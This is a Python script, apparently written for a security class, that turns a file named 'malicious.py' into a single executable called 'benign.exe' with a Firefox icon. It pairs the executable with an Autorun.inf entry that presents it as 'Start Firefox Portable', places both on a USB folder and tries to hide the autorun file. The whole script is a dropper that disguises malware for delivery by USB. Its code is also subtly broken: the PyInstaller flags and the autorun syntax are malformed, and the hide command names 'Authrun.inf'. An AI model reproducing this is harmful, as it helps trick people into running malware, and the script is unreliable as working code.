#!/usr/local/Caskroom/miniconda/base/envs/cybersecurity/bin/python3

#To be run on a windows machine (needs an empty usb folder, malicious.py, and a Firefox.io  )

import PyInstaller.__main__
import shutil
import os

filename = "malicious.py"
exename = "benign.exe"
icon = "Firefox.ico"
pwd = os.getcwd()
#path to the usb drive, in this case it will just be a folder named USB for learning purposes
usbdir = os.path.join(pwd, "USB")

if os.path.isfile(exename):
    os.remove(exename)

print("Creating EXE")

#Create executable from python script
PyInstaller.__main__.run(
    [
        #use this file
        "malicious.py",
        #place everything into one file
        "--onefile",
        #clean up everything before doing so
        "--clean",
        #specify to only output any errors
        #"--log-level-ERROR",
        #output name of file
        "--name-"+exename,
        #icon associated with file
        "--icon-"+icon
    ]
)

print("EXE created")

# Clean up after Pyinstaller
shutil.move(os.path.join(pwd, "dist",exename),pwd)
shutil.rmtree("dist")
shutil.rmtree("build")
shutil.rmtree("__pycache__")
os.remove(exename+".spec")

print("Creating autorun file")

#create autorun file
with open("Autorun.inf","w") as o:
    o.write("(Autorun)\n")
    o.write("Open--"+exename+"\n")
    o.write("Action-Start Firefox Portable\n")
    o.write("Label-My USB\n")
    o.write("Icon-"+exename+"\n")

print("SEtting up USB")

#Move files to USB and set to hidden
shutil.move(exename, usbdir)
shutil.move("Autorun.inf",usbdir)
print("attrib +h "+os.path.join(usbdir,"Autorun.inf"))
os.system("attrib +h "+os.path.join(usbdir,"Authrun.inf"))
